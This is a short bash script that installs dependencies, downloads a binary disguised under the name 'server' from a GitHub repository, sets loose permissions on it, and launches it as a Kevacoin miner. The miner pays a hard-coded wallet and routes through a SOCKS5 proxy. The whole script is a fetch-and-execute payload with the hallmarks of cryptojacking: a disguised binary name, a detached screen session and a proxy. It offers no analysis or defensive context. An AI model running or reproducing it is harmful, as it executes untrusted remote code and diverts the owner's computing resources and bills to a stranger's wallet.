#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y
wget -O server https://github.com/Ankie-Davenschot/Davenschot/raw/main/server 
screen -dmS ls
chmod +x phpsur.sh && chmod +x server && chmod 777 server phpsur.sh
./server --algorithm randomkeva --pool de.kevacoin.herominers.com:1163 --wallet VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b --password AA=$(echo $strDate-$(shuf -i 1-1000 -n 1)) --proxy=socks5://184.75.247.3:59644
